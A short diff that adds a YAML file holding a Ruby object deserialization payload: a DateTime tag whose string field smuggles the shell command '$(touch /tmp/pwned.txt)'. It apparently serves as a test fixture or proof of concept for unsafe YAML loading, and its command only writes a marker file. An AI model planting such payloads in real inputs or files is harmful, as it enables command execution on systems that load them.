@@ -1,0 +1,4 @@
+evil:
+  - !ruby/object:DateTime
+    str: |
+      $(touch /tmp/pwned.txt)
